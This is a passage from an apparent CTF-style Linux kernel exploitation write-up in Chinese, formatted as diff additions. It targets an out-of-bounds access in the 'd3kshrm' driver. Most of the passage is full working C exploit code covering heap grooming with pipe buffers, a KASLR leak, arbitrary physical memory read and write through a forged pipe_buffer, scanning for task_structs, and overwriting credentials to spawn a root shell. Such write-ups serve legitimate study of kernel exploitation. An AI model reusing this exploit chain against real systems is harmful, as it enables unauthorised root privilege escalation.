+堆布局构造是进阶验证的基础，本阶段的目标是在内核地址空间中创建特定的内存分布模式，为后续的越界访问创造条件。通过交替分配和释放操作，塑造pages数组与pipe_buffer交错分布的内存布局。
+
+首先创建240个管道对，为后续的内存操作建立基础结构。然后通过d3kshrm驱动模块创建32个chunk实例，每个chunk包含一个pages数组。设置`page_count=0`，意味着只分配chunk管理结构和pages数组，不分配实际物理页面。
+
+接着执行交替释放和重新分配策略，创建交错分布的内存布局。这种内存布局是后续越界访问的基础条件。
+
+```c
+int phase_heap_fengshui(void) {
+    log.info("===========================================================");
+    log.info("PHASE 2: HEAP SHAPING & MEMORY LAYOUT MANIPULATION         ");
+    log.info("===========================================================");
+
+    log.info("Creating %d pipes for heap shaping", MAX_PIPE_COUNT);
+    for (int i = 0; i < MAX_PIPE_COUNT; i++) {
+        create_pipe(i);
+    }
+
+    log.info("Spraying %d order-3 pages via chunk allocation", CHUNK_COUNT);
+    for (int i = 0; i < CHUNK_COUNT; i++) {
+        chunk_ids[i] = create_chunk(dev_fd[0], 0);
+    }
+
+    log.info("Freeing odd-indexed order-3 pages");
+    for (int i = 1; i < CHUNK_COUNT; i += 2) {
+        delete_chunk(dev_fd[0], chunk_ids[i]);
+    }
+
+    log.info("Spraying kmalloc-4k pipe buffers into freed odd slots");
+    for (int i = 0; i < MAX_PIPE_COUNT; i++) {
+        resize_pipe_buffer(i, PIPE_BUF_SIZE);
+    }
+
+    log.info("Freeing even-indexed order-3 pages");
+    for (int i = 0; i < CHUNK_COUNT; i += 2) {
+        delete_chunk(dev_fd[0], chunk_ids[i]);
+    }
+
+    log.info("Allocating vuln chunks in freed even slots");
+    for (int i = 0; i < CHUNK_COUNT; i++) {
+        chunk_ids[i] = create_chunk(dev_fd[i], VULN_CHUNK_SIZE);
+    }
+
+    return 0;
+}
+```
+
+**第二阶段内存布局变化**：
+
+<pre>
+堆布局构造过程：
+初始状态: 创建32个chunk，每个pages数组占4KB页
+         ┌───┬───┬───┬───┬───┬───┬───┬───┐
+         │P0 │P1 │P2 │P3 │P4 │P5 │P6 │P7 │ ... (共32页)
+         └───┴───┴───┴───┴───┴───┴───┴───┘
+         P0-P31: 32个pages数组页
+
+释放奇数页: 创建16个空闲区域
+         ┌───┬───┬───┬───┬───┬───┬───┬───┐
+         │P0 │F1 │P2 │F3 │P4 │F5 │P6 │F7 │
+         └───┴───┴───┴───┴───┴───┴───┴───┘
+         P0,P2,...: 保留的偶数索引页
+         F1,F3,...: 空闲的奇数索引页
+
+管道缓冲区填充: 空闲区域被pipe_buffer占用
+         ┌───┬───┬───┬───┬───┬───┬───┬───┐
+         │P0 │B1 │P2 │B3 │P4 │B5 │P6 │B7 │
+         └───┴───┴───┴───┴───┴───┴───┴───┘
+         B1,B3,...: pipe_buffer页
+
+释放偶数页: 为漏洞chunk准备空间
+         ┌───┬───┬───┬───┬───┬───┬───┬───┐
+         │F0 │B1 │F2 │B3 │F4 │B5 │F6 │B7 │
+         └───┴───┴───┴───┴───┴───┴───┴───┘
+         F0,F2,...: 空闲偶数索引页
+         B1,B3,...: pipe_buffer页
+
+最终布局: pages数组与pipe_buffer页交错分布
+         ┌───┬───┬───┬───┬───┬───┬───┬───┐
+         │C0 │B1 │C2 │B3 │C4 │B5 │C6 │B7 │
+         └───┴───┴───┴───┴───┴───┴───┴───┘
+         C0,C2,...: 漏洞chunk的pages数组页
+         B1,B3,...: pipe_buffer页
+</pre>
+
+### 5-4. 第三阶段：OOB检测准备
+
+在完成了基础的内存布局构造后，需要为OOB检测做准备。本阶段的目标是在管道缓冲区中写入标识数据，建立用户空间内存映射，为后续的OOB检测建立观察窗口。
+
+为了能够准确识别通过越界访问读取到的数据，在每个管道缓冲区的前16字节写入特定的标识数据。使用魔数"BinRacer"（0x72656361526e6942）作为标识，后8字节写入管道索引。这样当通过越界访问读取到pipe_buffer数据时，可以通过魔数确认访问成功，并通过索引确定具体的管道。
+
+接着为每个chunk建立用户空间内存映射。首先将chunk绑定到对应的文件描述符，然后通过mmap创建2MB的映射区域，最后使用mremap将映射区域扩展4KB包含越界访问点。这会在用户空间创建一段虚拟地址区域，当访问这段区域时，会触发缺页异常，进而调用d3kshrm模块的fault处理函数。
+
+```c
+int phase_prepare_oob_detection(void) {
+    log.info("===========================================================");
+    log.info("PHASE 3: PREPARING OOB READ DETECTION                     ");
+    log.info("===========================================================");
+
+    log.info("Writing magic numbers and indices to pipes for identification");
+    for (int i = 0; i < MAX_PIPE_COUNT; i++) {
+        pipe_buffer_data[0] = *(size_t *)"BinRacer";  // Magic number for validation
+        pipe_buffer_data[1] = i;                      // Pipe index for identification
+        write(pipe_fds[i][1], pipe_buffer_data, 0x10);
+    }
+
+    log.info("Triggering d3kshrm_mmap and extending mapping to establish overlap");
+    for (int i = 0; i < CHUNK_COUNT; i++) {
+        bind_chunk(dev_fd[i], chunk_ids[i]);
+        victim_map[i] =
+            mmap(NULL, MMAP_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, dev_fd[i], 0);
+        if (victim_map[i] == MAP_FAILED) {
+            log.error("mmap() failed on chunk %d", i);
+            return -1;
+        }
+
+        victim_map[i] = mremap(victim_map[i], MMAP_SIZE, MREMAP_SIZE, MREMAP_MAYMOVE);
+        if (victim_map[i] == MAP_FAILED) {
+            log.error("mremap() failed to extend mapping for chunk %d", i);
+            return -1;
+        }
+    }
+
+    return 0;
+}
+```
+
+**管道缓冲区标识数据结构**：
+
+<pre>
+每个管道缓冲区前16字节布局：
+┌─────────────────────────────────────────────────┐
+│ 偏移0-7: 魔数"BinRacer" (0x72656361526e6942)     │
+│ 偏移8-15: 管道索引 (用于后续识别)                 │
+└─────────────────────────────────────────────────┘
+</pre>
+
+**第三阶段流程图**：
+
+```mermaid
+flowchart TD
+    Start[开始OOB检测准备] --> WriteMagic[在管道缓冲区写入标识数据]
+    WriteMagic --> BindChunks[绑定chunk到文件描述符]
+    BindChunks --> CreateMapping[创建2MB内存映射]
+    CreateMapping --> ExtendMapping[扩展映射到2MB+4KB]
+    ExtendMapping --> CheckResult{检查映射结果}
+    CheckResult -- 成功 --> Complete[OOB检测准备完成]
+    CheckResult -- 失败 --> Error[准备失败退出]
+```
+
+### 5-5. 第四阶段：OOB检测执行
+
+在完成了OOB检测的准备工作后，开始执行OOB检测。本阶段的目标是触发边界检查漏洞，验证是否成功访问到目标pipe_buffer，记录成功的chunk和管道索引，为后续操作建立基础。
+
+对每个chunk的映射区域，计算越界地址`victim_map[i] + 0x1000 * 0x200`，然后尝试读取这个地址的8字节数据。这个读取操作会触发缺页异常，内核会调用`d3kshrm_vm_fault`函数。
+
+在`d3kshrm_vm_fault`中，函数计算页面偏移`pgoff = 0x200 = 512`。然后执行边界检查`if (vmf->pgoff > chunk->page_count)`。由于`chunk->page_count = 512`，条件`512 > 512`为false，检查通过，允许访问`pages[512]`。
+
+在精心构造的内存布局中，`chunk->pages`数组恰好占满一个4KB页，`chunk->pages[512]`的地址计算为`pages数组基地址+4096`，这恰好是相邻pipe_buffer页的起始位置。内核将这个地址的8字节数据解释为`struct page*`指针，实际上是pipe_buffer结构的`page`字段，指向管道数据页面。
+
+用户程序然后读取这个地址的8字节数据，这实际上是管道缓冲区的前8字节，即写入的魔数"BinRacer"。比较读取的值与预期的魔数，如果匹配，说明成功触发了漏洞，并且成功访问到了目标pipe_buffer。
+
+```c
+int phase_oob_detection_via_page_fault(void) {
+    log.info("===========================================================");
+    log.info("PHASE 4: DETECTING OOB READ VIA PAGE FAULTS                ");
+    log.info("===========================================================");
+
+    log.info("Triggering page faults to detect magic number 0x72656361526e6942 (BinRacer)");
+    for (int i = 0; i < CHUNK_COUNT; i++) {
+        log.debug("Testing chunk %d", i);
+        leak_data = (size_t *)(victim_map[i] + 0x1000 * 0x200);
+        if (leak_data[0] == 0x72656361526e6942) {  // "BinRacer" in little endian
+            victim_chunk_idx = i;
+            victim_pipe_idx = ((size_t *)(victim_map[i] + 0x1000 * 0x200))[1];
+            log.success("Found Victim pipe: %d, Victim chunk: %d", victim_pipe_idx,
+                        victim_chunk_idx);
+            hex_dump("Victim pipe data", leak_data, 0x30);
+            break;
+        }
+    }
+
+    if (victim_pipe_idx == -1) {
+        log.error("No victim pipe detected! Exploit failed at initial OOB detection");
+        return -1;
+    }
+
+    return 0;
+}
+```
+
+**第四阶段OOB检测流程**：
+
+```mermaid
+sequenceDiagram
+    participant User as 用户进程
+    participant CPU as CPU硬件
+    participant Fault as d3kshrm_vm_fault
+    participant PipeBuffer as pipe_buffer页
+
+    User->>CPU: 读取越界地址victim_map[i]+0x200000
+    CPU->>Fault: 触发缺页异常，CR2=访问地址
+
+    Note over Fault: 计算pgoff = (address - vma->vm_start) >> 12
+    Note over Fault: pgoff = 0x200 = 512
+    Note over Fault: 边界检查: 512 > 512? false
+    Note over Fault: 检查通过，允许访问
+
+    Fault->>Fault: 访问chunk->pages[512]
+    Fault->>PipeBuffer: 读取相邻pipe_buffer页起始处
+    PipeBuffer-->>Fault: 返回pipe_buffer->page指针
+
+    Fault-->>CPU: 建立页面映射
+    CPU-->>User: 继续执行读取指令
+
+    User->>User: 读取到魔数"BinRacer"
+    User->>User: 验证成功，记录victim_chunk_idx和victim_pipe_idx
+```
+
+### 5-6. 第五阶段：清理与二次喷洒
+
+在成功检测到OOB访问后，需要进行清理和二次喷洒，为内核指针泄漏准备条件。本阶段的目标是清理第一阶段资源，重新构造内存布局，创建更加可控的内存环境。
+
+`victim_pipe_idx`索引的管道是前面越界读取的管道，通过`close(pipe_fds[victim_pipe_idx][0])`和`close(pipe_fds[victim_pipe_idx][1])`关闭管道文件描述符，然后通过`munmap(victim_map[victim_chunk_idx], MREMAP_SIZE)`解除内存映射。这样，之前被越界访问的pipe_buffer->page对应的页面就被释放回order-0空闲列表。
+
+然后调整其他所有管道（除了victim_pipe_idx）的缓冲区大小为16KB（0x1000\*4），这会为每个管道分配一个包含4个pipe_buffer结构体的数组，每个数组大小为160字节，从kmalloc-192/order-0缓存中分配，从而占用刚才释放的order-0页面。
+
+接着解绑和删除`victim_chunk_idx`对应的chunk（即可以越界访问pipe_buffer所在物理页的chunk）。这个操作会释放chunk相关的资源，为重新分配准备空间。
+
+然后重新分配CHUNK_COUNT个chunk（从CHUNK_COUNT到CHUNK_COUNT\*2），这些chunk会占用刚才释放的chunk结构。最后为这些新chunk建立内存映射，为第二次越界访问做好准备。
+
+```c
+int phase_cleanup_and_order0_spray(void) {
+    log.info("===========================================================");
+    log.info("PHASE 5: CLEANUP & ORDER-0 HEAP SPRAY                      ");
+    log.info("===========================================================");
+
+    log.info("Cleaning victim pipe and preparing for second stage spray");
+    close(pipe_fds[victim_pipe_idx][0]);
+    close(pipe_fds[victim_pipe_idx][1]);
+    munmap(victim_map[victim_chunk_idx], MREMAP_SIZE);
+
+    log.info("Spraying kmalloc-192/order-0 objects via pipe buffer resize");
+    for (int i = 0; i < MAX_PIPE_COUNT; i++) {
+        if (i == victim_pipe_idx)
+            continue;
+        resize_pipe_buffer(i, 0x1000 * 4);
+    }
+
+    log.info("Freeing victim device chunk for reallocation");
+    unbind_chunk(dev_fd[victim_chunk_idx], chunk_ids[victim_chunk_idx]);
+    delete_chunk(dev_fd[victim_chunk_idx], chunk_ids[victim_chunk_idx]);
+
+    log.info("Spraying driver chunks to occupy freed memory regions");
+    for (int i = CHUNK_COUNT; i < CHUNK_COUNT * 2; i++) {
+        chunk_ids[i] = create_chunk(dev_fd[i], VULN_CHUNK_SIZE);
+    }
+
+    log.info("Triggering d3kshrm_mmap and extending mapping for second stage");
+    for (int i = CHUNK_COUNT; i < CHUNK_COUNT * 2; i++) {
+        bind_chunk(dev_fd[i], chunk_ids[i]);
+        victim_map[i] =
+            mmap(NULL, MMAP_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, dev_fd[i], 0);
+        if (victim_map[i] == MAP_FAILED) {
+            log.error("mmap() failed on chunk %d", i);
+            return -1;
+        }
+
+        victim_map[i] = mremap(victim_map[i], MMAP_SIZE, MREMAP_SIZE, MREMAP_MAYMOVE);
+        if (victim_map[i] == MAP_FAILED) {
+            log.error("mremap() failed to extend mapping for chunk %d", i);
+            return -1;
+        }
+    }
+
+    return 0;
+}
+```
+
+**第五阶段内存布局变化**：
+
+<pre>
+清理和二次喷洒内存布局变化：
+初始状态: 成功OOB检测后的布局
+         ┌───┬───┬───┬───┬───┬───┬───┬───┐
+         │C0 │B1 │C2 │B3 │C4 │B5 │C6 │B7 │
+         └───┴───┴───┴───┴───┴───┴───┴───┘
+         C0: victim_chunk (可越界访问B1)
+         B1: victim_pipe的pipe_buffer页
+
+清理目标: 关闭victim_pipe，解除victim_chunk映射
+         ┌───┬───┬───┬───┬───┬───┬───┬───┐
+         │F0 │F1 │C2 │B3 │C4 │B5 │C6 │B7 │
+         └───┴───┴───┴───┴───┴───┴───┴───┘
+         F0: 已释放的victim_chunk位置
+         F1: 已释放的victim_pipe_buffer页
+
+order-0喷洒: 调整其他管道缓冲区大小
+         ┌───┬───┬───┬───┬───┬───┬───┬───┐
+         │F0 │O1 │C2 │O3 │C4 │O5 │C6 │O7 │
+         └───┴───┴───┴───┴───┴───┴───┴───┘
+         O1,O3,...: order-0大小的pipe_buffer数组
+
+重新分配: 在新的位置分配chunk
+         ┌───┬───┬───┬───┬───┬───┬───┬───┐
+         │C8 │O1 │C9 │O3 │C10│O5 │C11│O7 │
+         └───┴───┴───┴───┴───┴───┴───┴───┘
+         C8,C9,...: 新分配的chunk (索引32-63)
+         O1,O3,...: order-0 pipe_buffer数组
+</pre>
+
+### 5-7. 第六阶段：内核指针泄漏
+
+在完成了清理和二次喷洒后，开始内核指针泄漏阶段。本阶段的目标是通过OOB读取泄漏内核指针，计算内核地址空间偏移，建立内核地址映射关系，为后续的物理内存访问奠定基础。
+
+`victim_chunk`已经重新占用，其`pages[512]`刚好可以访问二次堆喷的kmalloc-192的pipe_buffer结构数组所在物理页面，从而可以泄漏page地址和内核函数指针。
+
+扫描新分配的chunk（从CHUNK_COUNT到CHUNK_COUNT\*2），对每个chunk的映射区域计算越界地址并读取数据。检查读取的数据是否包含内核指针：第一个8字节值应该大于vmemmap_base（表示struct page指针），第三个8字节值应该大于kernel_base（表示函数指针）。
+
+当找到包含内核指针的数据时，将其复制到`fake_pipe_buf`结构中。这个结构模拟了pipe_buffer的内存布局，包含了关键的`page`和`ops`字段。通过`ops`字段可以计算内核偏移量：`kernel_offset = leak_data[2] - ANON_PIPE_BUF_OPS`，其中ANON_PIPE_BUF_OPS是`anon_pipe_buf_ops`的预设地址。
+
+```c
+int phase_kernel_pointer_leak_via_oob(void) {
+    log.info("===========================================================");
+    log.info("PHASE 6: KERNEL POINTER LEAK VIA OOB READ                  ");
+    log.info("===========================================================");
+
+    log.info("Scanning for kernel pointers in second victim chunk");
+    for (int i = CHUNK_COUNT; i < CHUNK_COUNT * 2; i++) {
+        log.debug("Testing chunk %d", i);
+        leak_data = (size_t *)(victim_map[i] + 0x1000 * 0x200);
+        if (leak_data[0] > vmemmap_base && leak_data[2] > kernel_base) {
+            memset(&fake_pipe_buf, 0, sizeof(struct pipe_buffer));
+            memcpy(&fake_pipe_buf, leak_data, sizeof(struct pipe_buffer));
+            second_victim_chunk_idx = i;
+            kernel_offset = leak_data[2] - ANON_PIPE_BUF_OPS;
+            kernel_base += kernel_offset;
+            log.success("Found Second Victim chunk: %d", second_victim_chunk_idx);
+            log.success("Leaked pipe_buffer->page kernel pointer: 0x%lx", leak_data[0]);
+            log.success("Leaked pipe_buffer->ops(anon_pipe_buf_ops) function pointer: 0x%lx",
+                        leak_data[2]);
+            log.success("kernel base address: 0x%lx", kernel_base);
+            log.success("kernel ASLR offset delta: 0x%lx", kernel_offset);
+            hex_dump("Leaked pipe_buffer structure", leak_data, 0x30);
+            break;
+        }
+    }
+
+    if (second_victim_chunk_idx == -1) {
+        log.error("No second victim pipe detected! Kernel pointer leak failed");
+        return -1;
+    }
+
+    return 0;
+}
+```
+
+**pipe_buffer结构布局**：
+
+```c
+/* offset      |    size */  type = struct pipe_buffer {
+/* 0x0000      |  0x0008 */    struct page *page;
+/* 0x0008      |  0x0004 */    unsigned int offset;
+/* 0x000c      |  0x0004 */    unsigned int len;
+/* 0x0010      |  0x0008 */    const struct pipe_buf_operations *ops;
+/* 0x0018      |  0x0004 */    unsigned int flags;
+/* XXX  4-byte hole      */
+/* 0x0020      |  0x0008 */    unsigned long private;
+
+                               /* total size (bytes):   40 */
+                             }
+```
+
+**内核地址计算原理**：
+
+```
+内核基地址计算方法:
+泄漏的ops指针: leak_data[2] = 实际anon_pipe_buf_ops地址
+预设的ops指针: ANON_PIPE_BUF_OPS = 预设anon_pipe_buf_ops地址
+内核偏移: kernel_offset = leak_data[2] - ANON_PIPE_BUF_OPS
+内核基地址: kernel_base += kernel_offset
+```
+
+### 5-8. 第七阶段：物理内存R/W原语
+
+在成功泄漏内核指针后，开始构建物理内存读写原语。本阶段的目标是构建任意物理内存读写能力，建立稳定的内存访问通道，为内核内存扫描和修改奠定基础。
+
+通过控制`fake_pipe_buf`结构，可以构建任意物理内存读写原语。`fake_pipe_buf`模拟了pipe_buffer的内存布局，通过修改其字段可以控制管道操作访问的物理内存位置。
+
+首先修改`fake_pipe_buf.offset`为0x8，跳过魔数字段。然后将修改后的结构写回越界访问点。这样当通过这个管道进行读写操作时，访问的将是`fake_pipe_buf`指定的物理内存位置。
+
+扫描所有管道（除了第一个目标管道），对每个管道读取8字节数据。如果读取到的不是魔数"BinRacer"，说明找到了目标管道。记录这个管道索引作为第二目标管道，用于后续的物理内存访问。
+
+```c
+int phase_arbitrary_phys_rw_primitive(void) {
+    log.info("===========================================================");
+    log.info("PHASE 7: ARBITRARY PHYSICAL MEMORY R/W PRIMITIVE           ");
+    log.info("===========================================================");
+
+    log.info("Configuring arbitrary physical memory read/write primitive");
+    fake_pipe_buf.offset = 0x8;  // Skip magic number to identify correct pipe
+    memcpy(leak_data, &fake_pipe_buf, sizeof(struct pipe_buffer));
+
+    log.info("Scanning pipes to identify target for arbitrary R/W operations");
+    for (int i = 0; i < MAX_PIPE_COUNT; i++) {
+        if (i == victim_pipe_idx)
+            continue;
+        size_t magic = 0;
+        read(pipe_fds[i][0], &magic, 0x8);
+        if (magic != 0x72656361526e6942) {  // Check for "BinRacer" magic
+            second_victim_pipe_idx = i;
+            log.success("Found target pipe for arbitrary R/W: %d", second_victim_pipe_idx);
+            break;
+        }
+    }
+
+    if (second_victim_pipe_idx == -1) {
+        log.error("Failed to locate target pipe for arbitrary R/W operations");
+        return -1;
+    }
+
+    return 0;
+}
+```
+
+**物理内存读写原语实现**：
+
+```c
+/**
+ * arbitrary_phys_read - Read arbitrary physical memory through pipe primitive
+ * @target_page: Physical page address
+ * @page_offset: Offset within target page
+ * @output_buffer: Destination buffer for read data
+ * @read_length: Number of bytes to read
+ */
+void arbitrary_phys_read(uint64_t target_page, uint32_t page_offset,
+                         void *output_buffer, uint64_t read_length) {
+    fake_pipe_buf.page = (struct page *)target_page;
+    fake_pipe_buf.offset = page_offset;
+    fake_pipe_buf.len = 0xfff;
+    memcpy(leak_data, &fake_pipe_buf, sizeof(struct pipe_buffer));
+    read(pipe_fds[second_victim_pipe_idx][0], output_buffer, read_length);
+}
+
+/**
+ * arbitrary_phys_write - Write arbitrary physical memory through pipe primitive
+ * @target_page: Physical page address
+ * @page_offset: Offset within target page
+ * @input_data: Source buffer containing write data
+ * @write_length: Number of bytes to write
+ */
+void arbitrary_phys_write(uint64_t target_page, uint32_t page_offset,
+                          void *input_data, uint64_t write_length) {
+    fake_pipe_buf.page = (struct page *)target_page;
+    fake_pipe_buf.offset = page_offset;
+    fake_pipe_buf.len = 0;
+    memcpy(leak_data, &fake_pipe_buf, sizeof(struct pipe_buffer));
+    write(pipe_fds[second_victim_pipe_idx][1], input_data, write_length);
+}
+```
+
+**物理内存访问流程图**：
+
+```mermaid
+flowchart TD
+    Start[开始物理内存访问] --> Setup[配置fake_pipe_buf<br>设置page指针和offset]
+    Setup --> Update[将fake_pipe_buf写回越界访问点]
+    Update --> Operation{选择操作类型}
+
+    Operation -- 读操作 --> ReadOp[调用read从管道读取]
+    ReadOp --> KernelRead[内核从指定物理地址读取数据]
+    KernelRead --> CopyData[数据复制到用户缓冲区]
+    CopyData --> ReturnRead[返回读取的数据]
+
+    Operation -- 写操作 --> WriteOp[调用write向管道写入]
+    WriteOp --> KernelWrite[内核向指定物理地址写入数据]
+    KernelWrite --> ReturnWrite[写入完成]
+```
+
+### 5-9. 第八阶段：内核内存扫描
+
+在构建了物理内存读写原语后，开始内核内存扫描阶段。本阶段的目标是扫描物理内存定位关键结构，查找当前进程和root进程task_struct，建立进程数据结构映射，为权限提升做准备。
+
+**`find_vmemmap_base()`函数分析**：
+
+这个函数用于定位vmemmap_base，即struct page数组的基地址。vmemmap是内核中用于管理物理页面的数据结构区域，通过定位这个区域可以建立物理地址与struct page指针之间的映射关系。
+
+函数从泄漏的page指针（fake_pipe_buf.page）开始，按页对齐后作为起始地址，然后向后扫描物理内存，查找内核代码特征。具体来说，它在每个候选地址读取16字节数据，检查是否匹配`secondary_startup_64`函数的特征。这个函数是内核启动早期的一个函数，其地址具有特定的特征。
+
+```c
+void find_vmemmap_base(void) {
+    vmemmap_base = (size_t)fake_pipe_buf.page & 0xfffffffff0000000;
+    size_t round = 0;
+
+    for (round = 0;; round++) {
+        size_t candidate_value[4] = {0};
+        arbitrary_phys_read((vmemmap_base + 0x2740), 0, candidate_value, 0x10);
+
+        if (candidate_value[0] > kernel_base &&
+            ((candidate_value[0] & 0xfff) == (SECONDARY_STARTUP_64 & 0xfff))) {
+            log.success("Located secondary_startup_64 signature in physmem, addr=0x%lx",
+                        candidate_value[0]);
+            break;
+        }
+        vmemmap_base -= 0x10000000;
+    }
+    log.success("Successfully mapped vmemmap_base address: 0x%lx", vmemmap_base);
+}
+```
+
+**`scan_for_task_structs()`函数分析**：
+
+这个函数用于扫描物理内存，查找当前进程和root进程（swapper）的task_struct。通过设置当前进程名称为"pwn4kernel"，然后在物理内存中搜索这个字符串，同时搜索"swapper"字符串。
+
+函数遍历物理内存页面，对每个页面读取内容并搜索特征字符串。当找到包含"pwn4kernel"的页面时，验证其周围的字段是否符合task_struct的结构。通过计算偏移量获取关键指针：cred、real_cred、parent、real_parent等。通过ptraced字段计算task_struct的虚拟地址。
+
+同样方法找到包含"swapper"的页面，获取root进程的task_struct信息。记录root进程的cred、nsproxy等关键指针。
+
+```c
+void scan_for_task_structs(void) {
+    size_t round = 0;
+    int current_task_found = 0;
+    int root_task_found = 0;
+    char page_content_buffer[0x1000] = {0};
+    size_t *current_comm_ptr;
+    size_t *root_comm_ptr;
+
+    prctl(PR_SET_NAME, "pwn4kernel");
+    log.info("Scanning physical memory pages to identify active task_struct instances");
+
+    for (round = 0;; round++) {
+        memset(page_content_buffer, 0, 0x1000);
+        arbitrary_phys_read((vmemmap_base + round * 0x40), 0, page_content_buffer, 0xf00);
+
+        current_comm_ptr = (size_t *)memmem(page_content_buffer, 0xf00, "pwn4kernel", 10);
+        root_comm_ptr = (size_t *)memmem(page_content_buffer, 0xf00, "swapper", 7);
+
+        if (current_comm_ptr && (current_comm_ptr[-2] > 0xffff888000000000) &&
+            (current_comm_ptr[-3] > 0xffff888000000000) &&
+            (current_comm_ptr[-59] > 0xffff888000000000) &&
+            (current_comm_ptr[-58] > 0xffff888000000000)) {
+            // 找到当前进程task_struct
+            current_task_found++;
+            parent_task_addr = current_comm_ptr[-59];
+            current_task_addr = current_comm_ptr[-52] - 0x5d8;
+            page_offset_base = (current_comm_ptr[-52] & 0xfffffffffffff000) - round * 0x1000;
+            page_offset_base &= 0xfffffffff0000000;
+            current_task_page_addr = (vmemmap_base + round * 0x40);
+            if (current_task_found && root_task_found)
+                break;
+        }
+
+        if (root_comm_ptr && (root_comm_ptr[-2] > 0xffff888000000000) &&
+            (root_comm_ptr[-3] > 0xffff888000000000) &&
+            (root_comm_ptr[-59] > 0xffff888000000000) &&
+            (root_comm_ptr[-58] > 0xffff888000000000)) {
+
+            if (root_task_found)
+                continue;
+
+            // 找到root进程task_struct
+            root_task_found++;
+            root_cred_addr = root_comm_ptr[-3];
+            root_task_addr = root_comm_ptr[-52] - 0x5d8;
+            root_nsproxy_addr = root_comm_ptr[9];
+            root_task_page_addr = (vmemmap_base + round * 0x40);
+            if (current_task_found && root_task_found)
+                break;
+        }
+    }
+}
+```
+
+```c
+int phase_kernel_memory_scanning(void) {
+    log.info("===========================================================");
+    log.info("PHASE 8: KERNEL MEMORY SCANNING & STRUCTURE LOCALIZATION   ");
+    log.info("===========================================================");
+
+    log.info("Initiating kernel memory exploration phase");
+    find_vmemmap_base();
+    scan_for_task_structs();
+
+    return 0;
+}
+```
+
+**内核内存扫描流程**：
+
+```mermaid
+flowchart TD
+    Start[开始内核内存扫描] --> FindVmemmap[定位vmemmap_base<br>扫描物理内存查找内核特征]
+    FindVmemmap --> SetName[设置进程名称为'pwn4kernel']
+    SetName --> ScanPages[扫描物理内存页面]
+
+    ScanPages --> CheckPage{页面内容检查}
+
+    CheckPage -- 包含'pwn4kernel' --> ValidateCurrent[验证当前进程task_struct字段]
+    ValidateCurrent --> ExtractCurrent[提取当前进程关键指针<br>cred, real_cred, parent等]
+    ValidateCurrent --> CalcCurrentAddr[计算当前进程task_struct地址]
+
+    CheckPage -- 包含'swapper' --> ValidateRoot[验证root进程task_struct字段]
+    ValidateRoot --> ExtractRoot[提取root进程关键指针<br>root_cred, root_nsproxy等]
+    ValidateRoot --> CalcRootAddr[计算root进程task_struct地址]
+
+    CheckPage -- 不匹配 --> ContinueScan[继续扫描下一页]
+
+    ExtractCurrent --> BothFound{是否找到两个进程?}
+    ExtractRoot --> BothFound
+
+    BothFound -- 是 --> Complete[扫描完成]
+    BothFound -- 否 --> ContinueScan
+```
+
+### 5-10. 第九阶段：权限提升验证
+
+在成功定位了关键的内核数据结构后，开始权限提升验证阶段。本阶段的目标是修改当前进程凭证，验证权限提升效果，获取root权限shell，完成整个验证过程。
+
+**`overwrite_cred_with_root()`函数分析**：
+
+这个函数用于将当前进程的凭证（cred和real_cred）替换为root进程的凭证，同时将命名空间代理（nsproxy）也替换为root进程的。通过读取当前进程的task_struct物理页面，修改其中的cred、real_cred和nsproxy指针，然后写回物理内存。
+
+函数首先读取当前进程的物理页面内容到缓冲区。在缓冲区中定位"pwn4kernel"字符串，验证周围的字段是否符合task_struct结构。然后修改关键指针：将cred和real_cred指针改为root_cred_addr，将nsproxy指针改为root_nsproxy_addr。
+
+将修改后的缓冲区写回物理内存。这样当前进程就拥有了root进程的凭证和命名空间，实现了权限提升。
+
+```c
+void overwrite_cred_with_root(void) {
+    size_t round = 0;
+    char task_copy_buffer[0x1000] = {0};
+    size_t *current_comm_field_ptr;
+
+    log.info("Modifying current task_struct credentials to gain root privileges");
+    for (round = 0;; round++) {
+        memset(task_copy_buffer, 0, 0x1000);
+        arbitrary_phys_read((current_task_page_addr + round * 0x40), 0, task_copy_buffer, 0xf00);
+
+        current_comm_field_ptr = (size_t *)memmem(task_copy_buffer, 0xf00, "pwn4kernel", 10);
+
+        if (current_comm_field_ptr && (current_comm_field_ptr[-2] > 0xffff888000000000) &&
+            (current_comm_field_ptr[-3] > 0xffff888000000000) &&
+            (current_comm_field_ptr[-59] > 0xffff888000000000) &&
+            (current_comm_field_ptr[-58] > 0xffff888000000000)) {
+            // 修改凭证指针
+            current_comm_field_ptr[-2] = root_cred_addr;  // 修改task->cred
+            current_comm_field_ptr[-3] = root_cred_addr;  // 修改task->real_cred
+            current_comm_field_ptr[9] = root_nsproxy_addr;  // 修改task->nsproxy
+
+            // 写回修改后的task_struct
+            arbitrary_phys_write((current_task_page_addr + round * 0x40), 0, task_copy_buffer, 0xf00);
+
+            log.success("[Round %d] Credential patching complete at phys page: 0x%lx", round,
+                        current_task_page_addr);
+            break;
+        }
+    }
+}
+```
+
+**凭证修改过程**：
+
+```
+修改前的task_struct关键字段:
+cred指针:       指向当前进程的cred结构
+real_cred指针:  指向当前进程的real_cred结构
+nsproxy指针:    指向当前进程的命名空间代理
+
+修改后的task_struct关键字段:
+cred指针:       指向root进程的cred结构 (root_cred_addr)
+real_cred指针:  指向root进程的real_cred结构 (root_cred_addr)
+nsproxy指针:    指向root进程的命名空间代理 (root_nsproxy_addr)
+```
+
+**凭证修改流程图**：
+
+```mermaid
+sequenceDiagram
+    participant User as 用户进程
+    participant PhysMem as 物理内存
+    participant Kernel as 内核
+
+    User->>PhysMem: 读取当前进程task_struct物理页面
+    PhysMem-->>User: 返回页面数据
+
+    Note over User: 在缓冲区中定位"pwn4kernel"字符串
+    Note over User: 验证task_struct结构完整性
+
+    User->>User: 修改关键指针：
+    User->>User: - cred指针 = root_cred_addr
+    User->>User: - real_cred指针 = root_cred_addr
+    User->>User: - nsproxy指针 = root_nsproxy_addr
+
+    User->>PhysMem: 将修改后的缓冲区写回物理内存
+    PhysMem-->>Kernel: 更新当前进程task_struct
+
+    Note over Kernel: 当前进程获得root凭证
+    Kernel-->>User: 进程权限提升完成
+
+    User->>User: 验证权限提升效果
+    User->>User: 启动root shell
+```
+
+```c
+int phase_privilege_escalation(void) {
+    log.info("===========================================================");
+    log.info("PHASE 9: CREDENTIAL OVERWRITE & PRIVILEGE ESCALATION       ");
+    log.info("===========================================================");
+
+    overwrite_cred_with_root();
+    get_root_shell();
+    return 0;
+}
+```
+
+### 5-11. 第十阶段：资源清理
+
+在完成了权限提升验证后，需要进行资源清理。本阶段的目标是释放所有分配的资源，确保系统状态恢复，避免资源泄漏，完成整个验证过程。
+
